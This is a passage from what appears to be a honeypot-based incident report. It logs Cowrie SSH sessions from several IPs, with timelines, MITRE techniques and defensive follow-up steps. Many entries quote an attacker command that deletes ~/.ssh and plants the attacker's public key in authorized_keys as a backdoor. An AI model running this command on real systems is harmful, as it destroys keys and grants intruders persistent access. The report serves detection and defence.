- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35a96fb5a16e

| Field | Detail |
|---|---|
| **Source IP** | `103.210.21[.]242` |
| **First Seen** | 2026-04-08 10:04 |
| **Last Seen** | 2026-04-08 10:04 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 10:04:19` | `cowrie.session.connect` |
| `2026-04-08 10:04:19` | `cowrie.client.version` |
| `2026-04-08 10:04:19` | `cowrie.client.kex` |
| `2026-04-08 10:04:20` | `cowrie.login.success` |
| `2026-04-08 10:04:20` | `cowrie.session.params` |
| `2026-04-08 10:04:20` | `cowrie.command.input` |
| `2026-04-08 10:04:20` | `cowrie.command.failed` |
| `2026-04-08 10:04:20` | `cowrie.log.closed` |
| `2026-04-08 10:04:20` | `cowrie.session.params` |
| `2026-04-08 10:04:20` | `cowrie.command.input` |
| `2026-04-08 10:04:20` | `cowrie.session.file_download` |
| `2026-04-08 10:04:20` | `cowrie.log.closed` |
| `2026-04-08 10:04:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.210.21[.]242` to AbuseIPDB if not already reported
- [ ] Block `103.210.21[.]242` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c662e02c1551

| Field | Detail |
|---|---|
| **Source IP** | `103.210.21[.]242` |
| **First Seen** | 2026-04-08 10:04 |
| **Last Seen** | 2026-04-08 10:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 10:04:22` | `cowrie.session.connect` |
| `2026-04-08 10:04:22` | `cowrie.client.version` |
| `2026-04-08 10:04:22` | `cowrie.client.kex` |
| `2026-04-08 10:04:23` | `cowrie.login.success` |
| `2026-04-08 10:04:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.210.21[.]242` to AbuseIPDB if not already reported
- [ ] Block `103.210.21[.]242` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57d58a0e1a2c

| Field | Detail |
|---|---|
| **Source IP** | `103.210.21[.]242` |
| **First Seen** | 2026-04-08 10:07 |
| **Last Seen** | 2026-04-08 10:07 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 10:07:37` | `cowrie.session.connect` |
| `2026-04-08 10:07:37` | `cowrie.client.version` |
| `2026-04-08 10:07:37` | `cowrie.client.kex` |
| `2026-04-08 10:07:38` | `cowrie.login.success` |
| `2026-04-08 10:07:38` | `cowrie.session.params` |
| `2026-04-08 10:07:38` | `cowrie.command.input` |
| `2026-04-08 10:07:38` | `cowrie.command.failed` |
| `2026-04-08 10:07:38` | `cowrie.log.closed` |
| `2026-04-08 10:07:38` | `cowrie.session.params` |
| `2026-04-08 10:07:38` | `cowrie.command.input` |
| `2026-04-08 10:07:38` | `cowrie.session.file_download` |
| `2026-04-08 10:07:38` | `cowrie.log.closed` |
| `2026-04-08 10:07:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.210.21[.]242` to AbuseIPDB if not already reported
- [ ] Block `103.210.21[.]242` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3abb50e6ad3

| Field | Detail |
|---|---|
| **Source IP** | `103.210.21[.]242` |
| **First Seen** | 2026-04-08 10:07 |
| **Last Seen** | 2026-04-08 10:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 10:07:40` | `cowrie.session.connect` |
| `2026-04-08 10:07:40` | `cowrie.client.version` |
| `2026-04-08 10:07:40` | `cowrie.client.kex` |
| `2026-04-08 10:07:41` | `cowrie.login.success` |
| `2026-04-08 10:07:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.210.21[.]242` to AbuseIPDB if not already reported
- [ ] Block `103.210.21[.]242` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32c258c952e3

| Field | Detail |
|---|---|
| **Source IP** | `20.2.83[.]149` |
| **First Seen** | 2026-04-08 10:07 |
| **Last Seen** | 2026-04-08 10:08 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 10:07:47` | `cowrie.session.connect` |
| `2026-04-08 10:07:48` | `cowrie.client.version` |
| `2026-04-08 10:07:48` | `cowrie.client.kex` |
| `2026-04-08 10:07:50` | `cowrie.login.success` |
| `2026-04-08 10:07:52` | `cowrie.session.params` |
| `2026-04-08 10:07:52` | `cowrie.command.input` |
| `2026-04-08 10:07:52` | `cowrie.command.failed` |
| `2026-04-08 10:07:52` | `cowrie.log.closed` |
| `2026-04-08 10:07:53` | `cowrie.session.params` |
| `2026-04-08 10:07:53` | `cowrie.command.input` |
| `2026-04-08 10:07:56` | `cowrie.session.file_download` |
| `2026-04-08 10:07:56` | `cowrie.log.closed` |
| `2026-04-08 10:08:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.2.83[.]149` to AbuseIPDB if not already reported
- [ ] Block `20.2.83[.]149` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1417d0005d6f

| Field | Detail |
|---|---|
| **Source IP** | `46.8.237[.]64` |
| **First Seen** | 2026-04-08 10:07 |
| **Last Seen** | 2026-04-08 10:07 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 10:07:50` | `cowrie.session.connect` |
| `2026-04-08 10:07:50` | `cowrie.client.version` |
| `2026-04-08 10:07:51` | `cowrie.client.kex` |
| `2026-04-08 10:07:51` | `cowrie.login.success` |
| `2026-04-08 10:07:52` | `cowrie.session.params` |
| `2026-04-08 10:07:52` | `cowrie.command.input` |
| `2026-04-08 10:07:52` | `cowrie.command.failed` |
| `2026-04-08 10:07:52` | `cowrie.log.closed` |
| `2026-04-08 10:07:52` | `cowrie.session.params` |
| `2026-04-08 10:07:52` | `cowrie.command.input` |
| `2026-04-08 10:07:52` | `cowrie.session.file_download` |
| `2026-04-08 10:07:52` | `cowrie.log.closed` |
| `2026-04-08 10:07:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.8.237[.]64` to AbuseIPDB if not already reported
- [ ] Block `46.8.237[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4fd5b5ed4396

| Field | Detail |
|---|---|
| **Source IP** | `46.8.237[.]64` |
| **First Seen** | 2026-04-08 10:07 |
| **Last Seen** | 2026-04-08 10:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 10:07:55` | `cowrie.session.connect` |
| `2026-04-08 10:07:55` | `cowrie.client.version` |
| `2026-04-08 10:07:55` | `cowrie.client.kex` |
| `2026-04-08 10:07:55` | `cowrie.login.success` |
| `2026-04-08 10:07:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.8.237[.]64` to AbuseIPDB if not already reported
- [ ] Block `46.8.237[.]64` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2accf14fcff

| Field | Detail |
|---|---|
| **Source IP** | `20.2.83[.]149` |
| **First Seen** | 2026-04-08 10:08 |
| **Last Seen** | 2026-04-08 10:08 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 10:08:00` | `cowrie.session.connect` |
| `2026-04-08 10:08:00` | `cowrie.client.version` |
| `2026-04-08 10:08:00` | `cowrie.client.kex` |
| `2026-04-08 10:08:08` | `cowrie.login.success` |
| `2026-04-08 10:08:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.2.83[.]149` to AbuseIPDB if not already reported
- [ ] Block `20.2.83[.]149` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dbb4274e6bff

| Field | Detail |
|---|---|
| **Source IP** | `103.210.21[.]242` |
| **First Seen** | 2026-04-08 10:09 |
| **Last Seen** | 2026-04-08 10:09 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 10:09:12` | `cowrie.session.connect` |
| `2026-04-08 10:09:12` | `cowrie.client.version` |
| `2026-04-08 10:09:12` | `cowrie.client.kex` |
| `2026-04-08 10:09:13` | `cowrie.login.success` |
| `2026-04-08 10:09:13` | `cowrie.session.params` |
| `2026-04-08 10:09:13` | `cowrie.command.input` |
| `2026-04-08 10:09:13` | `cowrie.command.failed` |
| `2026-04-08 10:09:13` | `cowrie.log.closed` |
| `2026-04-08 10:09:14` | `cowrie.session.params` |
| `2026-04-08 10:09:14` | `cowrie.command.input` |
| `2026-04-08 10:09:14` | `cowrie.session.file_download` |
| `2026-04-08 10:09:14` | `cowrie.log.closed` |
| `2026-04-08 10:09:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.210.21[.]242` to AbuseIPDB if not already reported
- [ ] Block `103.210.21[.]242` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c29a73a05264

| Field | Detail |
|---|---|
| **Source IP** | `103.210.21[.]242` |
| **First Seen** | 2026-04-08 10:09 |
| **Last Seen** | 2026-04-08 10:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 10:09:15` | `cowrie.session.connect` |
| `2026-04-08 10:09:15` | `cowrie.client.version` |
| `2026-04-08 10:09:16` | `cowrie.client.kex` |
| `2026-04-08 10:09:16` | `cowrie.login.success` |
| `2026-04-08 10:09:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.210.21[.]242` to AbuseIPDB if not already reported
- [ ] Block `103.210.21[.]242` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-870a0d344fc9

| Field | Detail |
|---|---|
| **Source IP** | `103.210.21[.]242` |
| **First Seen** | 2026-04-08 10:10 |
| **Last Seen** | 2026-04-08 10:10 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 10:10:46` | `cowrie.session.connect` |
| `2026-04-08 10:10:46` | `cowrie.client.version` |
| `2026-04-08 10:10:46` | `cowrie.client.kex` |
| `2026-04-08 10:10:47` | `cowrie.login.success` |
| `2026-04-08 10:10:47` | `cowrie.session.params` |
| `2026-04-08 10:10:47` | `cowrie.command.input` |
| `2026-04-08 10:10:47` | `cowrie.command.failed` |
| `2026-04-08 10:10:47` | `cowrie.log.closed` |
| `2026-04-08 10:10:47` | `cowrie.session.params` |
| `2026-04-08 10:10:47` | `cowrie.command.input` |
| `2026-04-08 10:10:48` | `cowrie.session.file_download` |
| `2026-04-08 10:10:48` | `cowrie.log.closed` |
| `2026-04-08 10:10:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.210.21[.]242` to AbuseIPDB if not already reported
- [ ] Block `103.210.21[.]242` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ccda7676f618

| Field | Detail |
|---|---|
| **Source IP** | `103.210.21[.]242` |
| **First Seen** | 2026-04-08 10:10 |
| **Last Seen** | 2026-04-08 10:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 10:10:49` | `cowrie.session.connect` |
| `2026-04-08 10:10:49` | `cowrie.client.version` |
| `2026-04-08 10:10:49` | `cowrie.client.kex` |
| `2026-04-08 10:10:50` | `cowrie.login.success` |
| `2026-04-08 10:10:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.210.21[.]242` to AbuseIPDB if not already reported
- [ ] Block `103.210.21[.]242` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3f59b395113

| Field | Detail |
|---|---|
| **Source IP** | `112.217.199[.]222` |
| **First Seen** | 2026-04-08 10:11 |
| **Last Seen** | 2026-04-08 10:11 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 10:11:00` | `cowrie.session.connect` |
| `2026-04-08 10:11:00` | `cowrie.client.version` |
| `2026-04-08 10:11:00` | `cowrie.client.kex` |
| `2026-04-08 10:11:01` | `cowrie.login.success` |
| `2026-04-08 10:11:01` | `cowrie.session.params` |
| `2026-04-08 10:11:01` | `cowrie.command.input` |
| `2026-04-08 10:11:01` | `cowrie.command.failed` |
| `2026-04-08 10:11:01` | `cowrie.log.closed` |
| `2026-04-08 10:11:02` | `cowrie.session.params` |
| `2026-04-08 10:11:02` | `cowrie.command.input` |
| `2026-04-08 10:11:02` | `cowrie.session.file_download` |
| `2026-04-08 10:11:02` | `cowrie.log.closed` |
| `2026-04-08 10:11:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.217.199[.]222` to AbuseIPDB if not already reported
- [ ] Block `112.217.199[.]222` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fab7997c2538

| Field | Detail |
|---|---|
| **Source IP** | `112.217.199[.]222` |
| **First Seen** | 2026-04-08 10:11 |
| **Last Seen** | 2026-04-08 10:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 10:11:04` | `cowrie.session.connect` |
| `2026-04-08 10:11:04` | `cowrie.client.version` |
| `2026-04-08 10:11:04` | `cowrie.client.kex` |
| `2026-04-08 10:11:04` | `cowrie.login.success` |
| `2026-04-08 10:11:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.217.199[.]222` to AbuseIPDB if not already reported
- [ ] Block `112.217.199[.]222` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1b13c36ea07

| Field | Detail |
|---|---|
| **Source IP** | `20.2.83[.]149` |
| **First Seen** | 2026-04-08 10:12 |
| **Last Seen** | 2026-04-08 10:12 |
| **Session Duration** | 27s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 10:12:08` | `cowrie.session.connect` |
| `2026-04-08 10:12:11` | `cowrie.client.version` |
| `2026-04-08 10:12:11` | `cowrie.client.kex` |
| `2026-04-08 10:12:14` | `cowrie.login.success` |
| `2026-04-08 10:12:20` | `cowrie.session.params` |
| `2026-04-08 10:12:20` | `cowrie.command.input` |
| `2026-04-08 10:12:20` | `cowrie.command.failed` |
| `2026-04-08 10:12:21` | `cowrie.log.closed` |
| `2026-04-08 10:12:25` | `cowrie.session.params` |
| `2026-04-08 10:12:25` | `cowrie.command.input` |
| `2026-04-08 10:12:25` | `cowrie.session.file_download` |
| `2026-04-08 10:12:25` | `cowrie.log.closed` |
| `2026-04-08 10:12:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.2.83[.]149` to AbuseIPDB if not already reported
- [ ] Block `20.2.83[.]149` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b01c989f8b50

| Field | Detail |
|---|---|
| **Source IP** | `20.2.83[.]149` |
| **First Seen** | 2026-04-08 10:12 |
| **Last Seen** | 2026-04-08 10:12 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 10:12:31` | `cowrie.session.connect` |
| `2026-04-08 10:12:33` | `cowrie.client.version` |
| `2026-04-08 10:12:33` | `cowrie.client.kex` |
| `2026-04-08 10:12:36` | `cowrie.login.success` |
| `2026-04-08 10:12:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.2.83[.]149` to AbuseIPDB if not already reported
- [ ] Block `20.2.83[.]149` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a65e4097268c

| Field | Detail |
|---|---|
| **Source IP** | `112.217.199[.]222` |
| **First Seen** | 2026-04-08 10:12 |
| **Last Seen** | 2026-04-08 10:12 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
